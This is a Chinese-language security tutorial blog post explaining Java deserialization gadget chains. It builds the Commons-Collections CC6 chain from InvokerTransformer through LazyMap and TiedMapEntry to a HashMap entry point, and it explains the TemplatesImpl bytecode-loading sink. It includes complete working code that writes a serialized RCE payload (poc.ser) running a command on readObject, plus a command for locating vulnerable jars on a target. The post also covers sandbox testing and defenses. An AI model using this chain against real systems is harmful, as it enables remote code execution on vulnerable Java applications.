---
title: Java 反序列化 Gadget 链入门
date: 2026-07-24
categories: 
- Java基础
- 漏洞分析
tags: 
- 反序列化
- gadget
- Java安全
- CommonsCollections
- 漏洞原理
---

# Java 反序列化 Gadget 链入门

[《Java基础》]({% post_url 2025-12-29-Java基础 %}) 里讲过序列化与反序列化：对象 → 字节流 → 还原对象。理解到这一步之后，大多数人都会卡在同一个地方——**`readObject()` 明明只是把对象还原出来，凭什么就能执行命令？**

本文用一个认知转变开头，然后从零把一条最简单的 gadget 链（CC6）逐层拼起来。拼完这条链，你对"反序列化 RCE"的理解就过关了。

> 先说结论：**gadget 链 = 用目标上现成的类，把"反序列化自动触发的方法"接成一条通向危险方法的调用链。**

---

## 一、先想通一件事：payload 里没有代码

反序列化漏洞最反直觉的地方在于：**攻击者发送的字节流里，一行代码都没有。**

```
攻击者发送：序列化后的对象图描述（只有类名 + 字段名 + 字段值）
目标执行：readObject() 用【目标自己 classpath 上的类】把这些对象 new 出来
```

真正"执行代码"的是目标上已有的类。攻击者只做了一件事：**设计这张对象图，让"还原对象的过程"被迫调用一串方法，最终落进一个危险方法。**

> 类比：payload 不是炸弹，而是"多米诺骨牌怎么摆"的说明书。牌是目标上现成的类，摆法由攻击者决定，`readObject()` 就是推倒第一张牌的那只手。

---

## 二、为什么"还原对象"会调用方法

这不是漏洞行为，是 Java 集合类的**固有设计**。反序列化时，集合类要重建自己的内部结构，必然会调用里面对象的某些方法：

| 类 | readObject 时自动做的事 | 触发的方法 |
|----|------------------------|-----------|
| `HashMap` | 重新 put 所有条目 | `key.hashCode()` |
| `HashSet` | 重新 add 元素 | `key.hashCode()` |
| `PriorityQueue` | 重建堆 | `comparator.compare(a, b)` |
| `TreeMap` | 重建红黑树 | `key.compareTo()` |

所以只要让 `key` / `comparator` 是一个"被精心设计的对象"，反序列化那一刻就会自动触发它的 `hashCode()` / `compareTo()` —— **这就是整个攻击的入口**。

---

## 三、三个名词：Sink / Gadget / Chain

| 名词 | 含义 | 例子 |
|------|------|------|
| **Sink（落点）** | 真正危险的方法 | `Runtime.exec`、`Method.invoke`、`TemplatesImpl.newTransformer` |
| **Gadget（小工具）** | 目标 classpath 上某个类，被调用时产生攻击者有用的动作（通常是"再调下一个方法"） | `InvokerTransformer`、`LazyMap`、`TiedMapEntry` |
| **Gadget Chain（链）** | 从 readObject 自动触发的方法，一步步级联到 Sink 的完整调用序列 | CC1 / CC6 / CC3 等 |

gadget 英文原意是"小装置"，安全圈借指"攻击链里一段可利用的代码/类"。理解它的关键：**每一块 gadget 都不知道自己在被用来攻击**——它只是一个"被调用就干活"的普通类，单独看完全无害，拼起来就是 RCE。

---

## 四、第一个 gadget：InvokerTransformer

`org.apache.commons.collections.functors.InvokerTransformer`（commons-collections 3.x）的 `transform(Object)` 方法，可以**反射调用任意对象上的任意方法**：

```java
InvokerTransformer t = new InvokerTransformer(
    "exec",                          // 要调用的方法名
    new Class[]{String.class},       // 方法参数类型
    new Object[]{"calc"});           // 方法参数值

t.transform(Runtime.getRuntime());   // 等价于 Runtime.getRuntime().exec("calc")
```

**它就是整条链的"引擎"**：任何一次 `transform(x)` 调用，都会变成"在 x 上反射调用任意方法"。这一步把"无害的 transform"和"危险的方法调用"焊在了一起。

---

## 五、把多个 gadget 串起来：ChainedTransformer

`ChainedTransformer.transform(obj)` 会依次调用数组里每个 transformer 的 `transform(obj)`：

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),                  // 1. 返回 Runtime.class（不变）
    new InvokerTransformer("getMethod",                      // 2. 反射拿 getRuntime 方法
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",                         // 3. 反射调用 getRuntime() → 实例
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",                           // 4. 反射调用 exec("calc")
        new Class[]{String.class},
        new Object[]{"calc"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null);   // 依次执行 1→2→3→4 → Runtime.getRuntime().exec("calc")
```

> 为什么不直接 `new InvokerTransformer("exec", ...)` 一步到位？因为 `Runtime` 构造方法是私有的，必须先反射 `getMethod("getRuntime")` 拿到方法、再 `invoke` 得到实例，最后才能 `exec`。这就是 payload 里常见"getMethod → invoke → exec"三段式的原因。

到这里，"有 `transform()` 调用 → 就执行命令"已经成立。现在的问题是：**反序列化时，谁会去调 `transform()`？**

---

## 六、谁来触发 transform：LazyMap

`LazyMap.get(key)` 有一个特性：**如果 map 里没有这个 key，就用 `factory.transform(key)` 生成值并放进去**（惰性加载，本来是给"延迟初始化"场景设计的）。

```java
Map lazyMap = LazyMap.decorate(new HashMap(), chain);   // factory = chain
lazyMap.get("任何不存在的key");   // → chain.transform("...") → RCE！
```

现在链条推进到：`LazyMap.get(key) → factory.transform(key) → ... → exec`。

---

## 七、反序列化入口：HashMap.readObject → hashCode → TiedMapEntry

还差最后一步：反序列化时，谁会调用 `LazyMap.get()`？

`TiedMapEntry` 是"绑定了一个 map 和 key"的条目，它的 `hashCode()` 内部会调用 `map.get(key)`：

```java
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
entry.hashCode();   // → lazyMap.get("key") → chain.transform → RCE
```

而 `HashMap.readObject()` 会对每个 key 调 `hashCode()`（见第二节）：

```java
// HashMap.readObject 内部（简化）
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();
    putVal(hash(key), key, value, false, false);   // hash(key) 会调 key.hashCode()
}
```

所以让 `HashMap` 的 key 是那个 `TiedMapEntry`，反序列化就自动触发整条链。

---

## 八、完整链（CC6）拼起来

```
HashMap.readObject()                          ← 入口（集合固有行为）
  → hash(key) → key.hashCode()                ← key = TiedMapEntry
  → TiedMapEntry.hashCode()
  → this.map.get(key)                         ← map = LazyMap
  → LazyMap.get(key)
  → !containsKey(key) → factory.transform()   ← factory = ChainedTransformer
  → ChainedTransformer.transform()
  → InvokerTransformer.transform() × 3        ← getMethod → invoke → exec
  → Runtime.getRuntime().exec("calc")         ← Sink：RCE
```

### 8.1 先手工验证：证明链本身是通的

```java
// 不经过反序列化，直接手工构造并触发 —— 链通的话会弹出 calc
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
entry.hashCode();   // ← 触发点，等价于整条链
```

> 这一步很重要：**先证明"手工触发能通"，再谈反序列化触发**。把整条链拆成"触发点方法调用" + "触发源是谁"，是理解所有链的通用方法。

### 8.2 再封装成真正的反序列化 payload

```java
// 两个关键细节：
// ① 构造链时先用无害占位 transformer，避免本地构造阶段就触发 exec
ChainedTransformer chain = new ChainedTransformer(
    new Transformer[]{new ConstantTransformer(1)});

Map lazyMap = LazyMap.decorate(new HashMap(), chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");

// ② 外层 HashMap：readObject 时会调 entry.hashCode()
Map expMap = new HashMap();
expMap.put(entry, "value");
lazyMap.remove("key");   // ★ put 时 LazyMap 已经把 key 加进去了，
                         //   必须移除，否则反序列化时 key 已存在、不会触发 transform

// ③ 最后把真正的链换进去（反射），再序列化
setFieldValue(chain, "iTransformers", transformers);

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("poc.ser"));
oos.writeObject(expMap);
```

```java
// 目标端：一句 readObject 就 RCE
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("poc.ser"));
ois.readObject();   // ← 弹出计算器
```

```java
public static void setFieldValue(Object obj, String name, Object value) throws Exception {
    Field f = obj.getClass().getDeclaredField(name);
    f.setAccessible(true);
    f.set(obj, value);
}
```

> 这段代码就是 ysoserial 里 `CommonsCollections6` 的手写简化版。**理解它的过程 = 理解所有"基于集合的 gadget 链"**。LazyMap/TiedMapEntry/ChainedTransformer 全部来自 `commons-collections 3.2.1`（Shiro 1.2.4 等老框架自带）。

---

## 九、另一个更强的 sink：TemplatesImpl（加载任意字节码）

CC6 依赖 `commons-collections`。而 `TemplatesImpl` 是 **JDK 自带**的，并且能干更狠的事——**加载攻击者提供的任意字节码**，不要求目标 classpath 上存在这个类：

```java
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", new byte[][]{恶意类的字节码});
setFieldValue(templates, "_name", "Evil");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

templates.newTransformer();
// → 内部 defineTransletClasses() 用自定义 ClassLoader 加载 _bytecodes
// → 实例化恶意类（须继承 AbstractTranslet）
// → 恶意类 static{} / 构造方法执行 → RCE
```

在链里它通常由 `InstantiateTransformer` 触发：

```
InstantiateTransformer(TrAXFilter.class, [Templates.class], [templates])
  → new TrAXFilter(templates)
  → TrAXFilter 构造方法里调 templates.newTransformer()   ← 触发点
  → defineClass 加载字节码 → 恶意类实例化 → RCE
```

**为什么它重要**：
1. **JDK 自带**，不依赖第三方库，通杀面大；
2. **能加载任意字节码** → [《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) 里把"注入类"送进 JVM，就是靠它（Shiro 的 CC2 / CC3 / CommonsBeanutils1 都用 TemplatesImpl）。

### 常见 Sink 一览

| Sink | 作用 | 依赖 | 典型触发 |
|------|------|------|---------|
| `Runtime.exec` | 执行命令 | JDK | 反射调用 |
| `InvokerTransformer` | 反射调用任意方法 | commons-collections | `transform()` |
| `TemplatesImpl.newTransformer` | 加载任意字节码 | JDK | `TrAXFilter` 构造 / 方法调用 |
| `JdbcRowSetImpl.setAutoCommit` | 触发 JNDI lookup | JDK | Fastjson setter 调用 |

> 后两个都是 JDK 自带，所以才会在 Fastjson（`JdbcRowSetImpl`）、Shiro（`TemplatesImpl`）里反复出现——见[《Fastjson反序列化漏洞深度剖析》]({% post_url 2026-02-16-Fastjson反序列化漏洞深度剖析 %})。

---

## 十、gadget 从哪来 + 怎么找链

- **gadget 是目标 classpath 上的现有类**。同一个目标上，`commons-collections`、`commons-beanutils`、`c3p0`、以及 JDK 自带类（`TemplatesImpl`、`JdbcRowSetImpl`）都可能当 gadget；
- **找链 = 从入口到 sink 找一条调用路径**。ysoserial 已经把常用链写好了（`CommonsCollections1/2/6`、`CommonsBeanutils1`、`JRMPClient` 等），你可以直接借鉴思路；
- **实战先摸依赖**：`find . -name "commons-collections*.jar" -o -name "commons-beanutils*.jar"`，再决定用哪条链。

---

## 十一、验证 / 调试一条链

1. **先手工触发**（如 8.1），确认链本身通不通；
2. 序列化 payload，在**独立沙箱**里 `readObject()` 验证，别在真实目标上试；
3. 打日志 / 断点观察方法调用顺序，对照预期链，找到卡在哪一环。

---

## 十二、检测与防御

| 层面 | 措施 |
|------|------|
| 入口 | 不反序列化不可信数据；用 JSON 等安全格式替代 |
| 过滤 | `ObjectInputFilter`（JDK 9+）做白名单，禁止反序列化 gadget 类 |
| 依赖 | 升级 `commons-collections` 到 3.2.2+（默认禁用 InvokerTransformer 反序列化） |
| 组件 | Shiro 换随机密钥、Fastjson 开 SafeMode（见对应文章） |

---

## 总结

一句话：**gadget 链 = 用目标上现成的类，把"反序列化自动触发的方法"接成一条通向危险方法的调用链。**

把四个认知串起来：

1. **payload 没有代码，只有对象图**——执行代码的是目标上的类；
2. **readObject 还原对象时会自动调 `hashCode` / `compareTo` 等方法**（入口）；
3. **每个 gadget 是"被调用就产生有用动作"的普通类**（跳板）；
4. **从入口一路级联到 `Runtime.exec` 或 `TemplatesImpl`**（落点）。

建议动手做一遍：把第八节的代码跑通，从"手工触发"到"反序列化触发"，这条链你就彻底拿下了。

> **延伸阅读**：[《Java基础》]({% post_url 2025-12-29-Java基础 %}) 的序列化章节 | [《Fastjson反序列化漏洞深度剖析》]({% post_url 2026-02-16-Fastjson反序列化漏洞深度剖析 %}) | [《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) | [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})
